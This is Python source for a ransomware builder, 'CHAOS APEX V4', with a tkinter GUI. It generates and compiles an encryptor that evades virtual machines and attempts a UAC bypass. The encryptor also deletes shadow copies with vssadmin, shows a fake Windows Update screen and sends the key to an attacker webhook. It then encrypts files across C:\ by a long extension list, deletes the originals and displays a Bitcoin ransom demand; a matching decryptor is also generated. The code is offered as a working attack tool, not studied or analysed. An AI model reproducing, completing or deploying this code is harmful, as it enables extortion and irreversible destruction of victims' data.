import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import subprocess
import sys

COLORS = {
    "bg": "#09090b", "panel": "#18181b", "border": "#27272a", 
    "primary": "#ef4444", "text": "#e4e4e7", "text_muted": "#a1a1aa", "accent": "#22c55e"
}

TARGET_EXTENSIONS = [
    ".txt", ".doc", ".docx", ".mp3", ".xls", ".xlsx", ".ppt", ".sql", ".wmv", ".mp4", ".dll", ".jar", 
    ".pptx", ".odt", ".jpg", ".tar", ".gz", ".bmp", ".pbm", ".rtf", ".png", ".csv", ".mdb", ".sln", 
    ".php", ".avi", ".mov", ".flv", ".amv", ".mpv", ".mtv", ".asp", ".aspx", ".html", ".xml", ".psd", 
    ".pdf", ".exe", ".rv", ".rvx", ".ved", ".wm", ".wma", ".midi", ".fla", ".ico", ".gif", ".GIF", 
    ".ogg", ".mpg", ".icns", ".RAR", ".zip", ".BAT", ".c", ".PNG", ".7z", ".sql", ".m4a", ".d3dbsp", 
    ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", 
    ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", 
    ".hplg", ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", 
    ".sb", ".fos", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", ".menu", ".layout", ".dmp", ".blob", 
    ".esm", ".vcf", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", 
    ".rim", ".w3x", ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", 
    ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", "rofl", ".hkx", ".bar", 
    ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", 
    ".sav", ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".bigwallet", ".wotreplay", 
    ".xxx", ".desc", ".py", ".m3u", ".js", ".css", ".rb", ".jpeg", ".p7c", ".p7b", ".p12", 
    ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", "r3d", ".rw2", 
    ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrw", ".ref", ".mef", ".erf", ".kdc", ".dcr", 
    ".cr2", ".crw", ".cerber", ".WNCRY", ".dsewrbg", ".bay", ".sr2", ".srf", ".arw", ".3fr", 
    ".dng", ".jpe", ".cdr", ".indd", ".ai", ".eps", ".pdd", ".dbf", ".mdf", ".wb2", ".wpd", 
    ".dxg", ".xf", ".dwg", ".pst", ".vbs", ".accdb", ".pptm", ".xlsb", ".xlsm", ".wps", 
    ".docm", ".odb", ".odc", "odm", ".odp", ".ods", ".odt"
]

class ApexBuilderV4:
    def __init__(self, root):
        self.root = root
        self.root.title("CHAOS APEX V4 - HARDCORE")
        self.root.geometry("950x700")
        self.root.configure(bg=COLORS["bg"])
        self.root.resizable(False, False)

        # Variables
        self.btc_address = tk.StringVar(value="bc1qexample")
        self.webhook = tk.StringVar(value="")
        self.custom_title = tk.StringVar(value="YOUR FILES ARE ENCRYPTED")
        
        # The New Feature Flags
        self.enable_uac = tk.BooleanVar(value=True)
        self.enable_antivm = tk.BooleanVar(value=True)
        self.enable_shadow = tk.BooleanVar(value=True)
        self.fake_update = tk.BooleanVar(value=True)

        self.ransom_message = tk.StringVar(value="All files encrypted. Send BTC to recover.")
        
        self.create_ui()

    def create_ui(self):
        # Header
        header = tk.Frame(self.root, bg=COLORS["panel"], height=50)
        header.pack(fill="x")
        tk.Label(header, text="CHAOS APEX V4", font=("Segoe UI", 22, "bold"), fg=COLORS["primary"], bg=COLORS["panel"]).pack(side="left", padx=20, pady=10)

        # Notebook
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill="both", expand=True, padx=20, pady=20)

        # Tab 1: Advanced Settings
        tab_adv = tk.Frame(notebook, bg=COLORS["bg"])
        notebook.add(tab_adv, text="Advanced Modules")

        # Group: Defense Evasion
        evasion_frame = tk.LabelFrame(tab_adv, text="Defense Evasion", bg=COLORS["panel"], fg=COLORS["text_muted"], padx=10, pady=10)
        evasion_frame.pack(fill="x", padx=10, pady=10)

        tk.Checkbutton(evasion_frame, text="Enable UAC Bypass (Event Viewer Trick)", variable=self.enable_uac, 
                       bg=COLORS["panel"], fg=COLORS["text"], selectcolor=COLORS["border"]).pack(anchor="w")
        tk.Checkbutton(evasion_frame, text="Enable Anti-VM (Sandbox Detection)", variable=self.enable_antivm, 
                       bg=COLORS["panel"], fg=COLORS["text"], selectcolor=COLORS["border"]).pack(anchor="w")
        tk.Checkbutton(evasion_frame, text="Delete Shadow Copies (No Restore)", variable=self.enable_shadow, 
                       bg=COLORS["panel"], fg=COLORS["text"], selectcolor=COLORS["border"]).pack(anchor="w")

        # Group: Deception
        deception_frame = tk.LabelFrame(tab_adv, text="Deception", bg=COLORS["panel"], fg=COLORS["text_muted"], padx=10, pady=10)
        deception_frame.pack(fill="x", padx=10, pady=10)
        tk.Checkbutton(deception_frame, text="Fake Windows Update Screen", variable=self.fake_update, 
                       bg=COLORS["panel"], fg=COLORS["text"], selectcolor=COLORS["border"]).pack(anchor="w")

        # Tab 2: Config & Note
        tab_note = tk.Frame(notebook, bg=COLORS["bg"])
        notebook.add(tab_note, text="Config & Note")

        tk.Label(tab_note, text="Bitcoin Wallet", bg=COLORS["bg"], fg=COLORS["text_muted"]).grid(row=0, column=0, sticky="w", padx=10)
        tk.Entry(tab_note, textvariable=self.btc_address, bg=COLORS["border"], fg="white", width=60).grid(row=1, column=0, padx=10, pady=5)

        tk.Label(tab_note, text="Webhook", bg=COLORS["bg"], fg=COLORS["text_muted"]).grid(row=2, column=0, sticky="w", padx=10)
        tk.Entry(tab_note, textvariable=self.webhook, bg=COLORS["border"], fg="white", width=60).grid(row=3, column=0, padx=10, pady=5)
        
        tk.Label(tab_note, text="Popup Title", bg=COLORS["bg"], fg=COLORS["text_muted"]).grid(row=4, column=0, sticky="w", padx=10, pady=10)
        tk.Entry(tab_note, textvariable=self.custom_title, bg=COLORS["border"], fg="white", width=60).grid(row=5, column=0, padx=10)

        tk.Label(tab_note, text="Message", bg=COLORS["bg"], fg=COLORS["text_muted"]).grid(row=6, column=0, sticky="w", padx=10)
        self.txt_message = scrolledtext.ScrolledText(tab_note, height=10, bg=COLORS["border"], fg="white")
        self.txt_message.insert(tk.END, self.ransom_message.get())
        self.txt_message.grid(row=7, column=0, padx=10, pady=5, sticky="ew")

        # Bottom Buttons
        btn_frame = tk.Frame(self.root, bg=COLORS["bg"], height=60)
        btn_frame.pack(fill="x", side="bottom")
        
        tk.Button(btn_frame, text="Save Encryptor", bg=COLORS["border"], fg="white", width=20, command=lambda: self.save_code("encrypt")).pack(side="left", padx=10, pady=10)
        tk.Button(btn_frame, text="Build Encryptor EXE", bg=COLORS["primary"], fg="white", width=20, command=lambda: self.compile_exe("encrypt")).pack(side="left", padx=10, pady=10)
        
        tk.Button(btn_frame, text="Save Decryptor", bg=COLORS["border"], fg="white", width=20, command=lambda: self.save_code("decrypt")).pack(side="right", padx=10, pady=10)
        tk.Button(btn_frame, text="Build Decryptor EXE", bg=COLORS["accent"], fg="white", width=20, command=lambda: self.compile_exe("decrypt")).pack(side="right", padx=10, pady=10)

    def get_payload(self, mode):
        btc = self.btc_address.get()
        wh = self.webhook.get()
        title = self.custom_title.get()
        msg = self.txt_message.get("1.0", tk.END).strip()
        uac = self.enable_uac.get()
        avm = self.enable_antivm.get()
        shd = self.enable_shadow.get()
        fake = self.fake_update.get()

        msg = msg.replace("\\", "\\\\")

        if mode == "encrypt":
            return f"""
import os, sys, subprocess, time, threading, ctypes, uuid, platform
try:
    import requests
    from cryptography.fernet import Fernet
except: sys.exit()

# CONFIG
BTC = "{btc}"
WEBHOOK = "{wh}"
TITLE = "{title}"
MESSAGE = "{msg}"
TARGETS = {TARGET_EXTENSIONS}
UAC_BYPASS = {str(uac).lower()}
ANTI_VM = {str(avm).lower()}
KILL_SHADOW = {str(shd).lower()}
FAKE_UPDATE = {str(fake).lower()}

def check_uac():
    # Basic UAC Bypass using Event Viewer (Requires Admin rights on target usually)
    # If current user is not admin, it tries to relaunch via sdclt
    if UAC_BYPASS:
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                # Trigger UAC bypass
                subprocess.Popen("cmd.exe /c sdclt.exe /KickOffElev", shell=True)
                return True # Bypass attempt triggered
        except:
            pass
    return False

def check_vm():
    if not ANTI_VM: return False
    # Check Registry keys
    if os.path.exists("C:\\windows\\system32\\vmtoolsd.exe"): return True
    if os.path.exists("C:\\windows\\system32\\vmmouse.sys"): return True
    # Check MAC
    try:
        mac = uuid.getnode()
        if mac >> 24 == 0x005056 or mac >> 24 == 0x000c29 or mac >> 24 == 0x001c14:
            return True
    except: pass
    return False

def kill_shadows():
    if not KILL_SHADOW: return
    subprocess.run("vssadmin delete shadows /all /quiet", shell=True)

def fake_update_gui():
    import tkinter as tk
    r = tk.Tk()
    r.title("Configuring Updates")
    r.attributes("-fullscreen", True)
    r.configure(bg="white")
    tk.Label(r, text="Working on updates", font=("Segoe UI", 20), bg="white", fg="#0067b8").pack(pady=100)
    r.update()
    time.sleep(10)
    r.destroy()

def show_popup():
    import tkinter as tk
    root = tk.Tk()
    root.title(TITLE)
    root.geometry("600x400")
    root.configure(bg="#1e1e1e")
    root.attributes("-topmost", True)
    tk.Label(root, text=TITLE, font=("Arial", 16, "bold"), bg="#1e1e1e", fg="#ff4d4d").pack(pady=20)
    tk.Label(root, text=MESSAGE, bg="#1e1e1e", fg="white", font=("Arial", 11)).pack(pady=10)
    tk.Label(root, text="BTC: " + BTC, font=("Consolas", 10, "bold"), bg="#1e1e1e", fg="#00ff9d").pack(pady=20)
    root.mainloop()

def start():
    if check_vm():
        sys.exit()

    # Try UAC Bypass first
    check_uac()

    kill_shadows()

    key = Fernet.generate_key()
    fernet = Fernet(key)
    try: requests.post(WEBHOOK, json={{'content': f"Key: {{key}}\\nID: {{uuid.getnode()}}"}})
    except: pass

    if FAKE_UPDATE:
        t = threading.Thread(target=fake_update_gui)
        t.start()
        time.sleep(2)

    # Encryption Loop
    for root, dirs, files in os.walk("C:\\\\"):
        for file in files:
            if any(file.lower().endswith(ext) for ext in TARGETS):
                try:
                    path = os.path.join(root, file)
                    with open(path, "rb") as f: data = f.read()
                    with open(path + ".locked", "wb") as f: f.write(fernet.encrypt(data))
                    os.remove(path)
                except: pass
    
    with open("README.txt", "w") as f:
        f.write(TITLE + "\\n\\n" + MESSAGE + "\\n\\n" + BTC)
        
    show_popup()

if __name__ == "__main__":
    start()
"""
        else:
            return f"""
import os, sys
from cryptography.fernet import Fernet

def decrypt():
    key = input("Enter Key: ").strip()
    try: fernet = Fernet(key)
    except: print("INVALID KEY"); return
    
    TARGETS = {TARGET_EXTENSIONS}
    count = 0
    for root, dirs, files in os.walk("C:\\\\"):
        for file in files:
            if file.endswith(".locked"):
                orig = file[:-7]
                if any(orig.lower().endswith(ext) for ext in TARGETS):
                    try:
                        path = os.path.join(root, file)
                        with open(path, "rb") as f: data = f.read()
                        with open(os.path.join(root, orig), "wb") as f: f.write(fernet.decrypt(data))
                        os.remove(path)
                        count += 1
                    except: pass
    print(f"Restored {{count}} files.")
if __name__ == "__main__": decrypt()
"""

    def save_code(self, mode):
        code = self.get_payload(mode)
        path = filedialog.asksaveasfilename(defaultextension=".py", filetypes=[("Python", "*.py")])
        if path:
            with open(path, "w") as f: f.write(code)

    def compile_exe(self, mode):
        script = f"apex_{mode}.py"
        code = self.get_payload(mode)
        with open(script, "w") as f: f.write(code)
        try:
            subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--clean", script], check=True)
            messagebox.showinfo("Built", "Check 'dist' folder for EXE.")
        except Exception as e:
            messagebox.showerror("Error", str(e))

if __name__ == "__main__":
    root = tk.Tk()
    app = ApexBuilderV4(root)
    root.mainloop()
